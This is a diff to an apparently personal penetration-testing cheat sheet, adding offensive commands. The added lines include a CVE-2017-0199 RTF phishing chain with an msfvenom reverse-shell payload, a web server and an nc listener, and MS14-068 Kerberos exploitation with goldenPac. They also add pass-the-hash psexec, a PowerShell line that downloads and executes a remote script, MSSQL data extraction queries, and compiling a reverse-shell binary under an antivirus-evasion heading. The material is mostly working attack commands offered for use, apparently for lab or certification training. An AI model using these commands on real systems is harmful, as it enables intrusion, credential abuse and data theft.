@@ -8,6 +8,8 @@ Linux
 hostname && whoami && cat proof.txt && ip a
 
 Windows (Cmd)
+hostname && whoami && type user.txt && ipconfig /all
+hostname && whoami && type root.txt && ipconfig /all
 hostname && whoami && type proof.txt && ipconfig /all
 hostname && type proof.txt && ipconfig /all
 
@@ -147,10 +149,10 @@ smtp-user-enum -M VRFY -U wordlist -t IP -d example.com
 #### [RTF Vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2017-0199)
 
 1. msfvenom -p windows/shell_reverse_tcp LHOST=local-IP LPORT=443 -f hta-psh -o msfv.hta
-2. python2 cve-2017-0199_toolkit.py -M gen -t RTF -w DNS.RTF -u http://local-WebServIP:Port/msfv.hta
+2. python2 cve-2017-0199_toolkit.py -M gen -t RTF -w MailFile.RTF -u http://local-WebServIP:Port/msfv.hta
 3. python2 -m SimpleHTTPServer 80
 4. nc -lnvp 443
-5. sendEmail -f FromEmail@example.com -t ToEmail@example.com -u "Subject" -m "Message" -a MaliFile.RTF -s TargetIP -v
+5. sendEmail -f FromEmail@example.com -t ToEmail@example.com -u "Subject" -m "Message" -a MailFile.RTF -s TargetIP -v
 
 ### DNS
 
@@ -452,10 +454,16 @@ alternatively use
 mssqlclient.py user:password@$ip -windows-auth
 ```
 
+or without --windows-auth
+
+```
+mssqlclient.py user:password@$ip
+```
+
 Check for users with SA level permissions (users that can enable xp_cmdshell)
 
 ```
-select IS_SRVROLEMEMBER (​'sysadmin'​)
+select IS_SRVROLEMEMBER ('sysadmin')
 ```
 
 Run after spinning up an smbserver to capture hash
@@ -501,6 +509,39 @@ after every command
 
 ```
 go
+```
+
+
+##### Enumerating MSSQL
+
+Get all available databases
+
+```
+SELECT name FROM master.dbo.sysdatabases
+```
+
+Get everything in relation to tables from a database of interest
+
+```
+SELECT * FROM DatabaseOfInterest.INFORMATION_SCHEMA.TABLES
+```
+
+Get everything in relation to columns from a database of interest
+
+```
+SELECT * FROM DatabaseOfInterest.INFORMATION_SCHEMA.COLUMNS
+```
+
+Change to another database
+
+```
+use DatabaseOfInterest
+```
+
+Extract Data
+
+```
+select Column_Of_Interest,Column_Of_Interest from Table_Of_Interest
 ```
 
 [MySQL SQL Injection Practical Cheat Sheet](https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/)
@@ -571,7 +612,27 @@ go
 
 ### Kerberos
 
-![](20220808235219.png) 
+#### MS14-068
+
+```
+cd /usr/share/windows-kernel-exploits/MS14-068/pykek
+```
+
+```
+rpcclient $ip -U SomeUser
+```
+
+```
+lookupname SomeUser
+```
+
+```
+python2 ./ms14-068.py -u user@domain.local -p SomePassword -d $ip -s SID
+```
+
+```
+impacket-goldenPac domain.local/SomeUser:SomePassword@dc.domain.ocal
+```
 
 #### Validate users
 
@@ -941,8 +1002,8 @@ Add-DomainGroupMember -Identity 'Domain Admins' -Members 'CompromisedUser' -Cred
 - smbclient -N //IP/share -c ls | awk '{ print $1 }' -- this will get the names of the directories of the first column for potential users
 - ms09_050_smb2_negotiate_func_index Exploit (Windows Only)
 
-*try all three if needed smbexec,psexec,wmiexec*
-- psexec.py example.com/username@ip -- may or may not need credentials
+*try all three if needed smbexec,psexec,wmiexec* (if you cannot upload ry tools anyway, you may get a shell)
+- psexec.py example.com/username@ip -- may or may not need credentials 
 - psexec.py ./administrator@IP -hashes :NTHASH
 - smbexec.py user:password@IP
 - wmiexec
@@ -1258,7 +1319,10 @@ https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70
     - windowscheduler
     - check `C:\Program Files (x86)\SystemScheduler\Events` log files. for any running events. this is similar to linux cronjobs.
 ### PowerView Commands
+
+	
   - powershell -exec bypass "iex (New-Object Net.WebClient).DownloadString('http://192.168.119.241:8080/powerview.ps1');Get-NetLoggedon -ComputerName DC01"
+  - Get-DomainGroup -MemberIdentity SomeUser | select samaccountname
   - Get-NetComputer | select operatingsystem - gets a list of all operating systems on the domain
   - Get-NetUser | select cn - gets a list of all users on the domain
   - Get-ADPrincipalGroupMembership "username" | select name
@@ -1841,6 +1905,24 @@ smbserver.py share `pwd` -smb2support -ip 172.16.0.1
 
 ## Antivirus Evasion
 
+### Check If Windows Defender is Running
+
+```
+sc.exe query windefend
+```
+
+Or With PowerShell
+
+```
+Get-Service windefend
+```
+
+### Prometheus
+
+```
+i686-w64-mingw32-g++ /opt/prometheus/prometheus.cpp -o thescriptkid.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
+```
+
 ### Amsi bypass 
 
 https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/
@@ -1973,12 +2055,6 @@ Response.Write(thisDir)%>
 </BODY>
 <%Response.write("<!-"&"-") %>
 -->
-```
-
-### Prometheus
-
-```
-i686-w64-mingw32-g++ /opt/prometheus/prometheus.cpp -o thescriptkid.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
 ```
 
 ## Malware Analysis
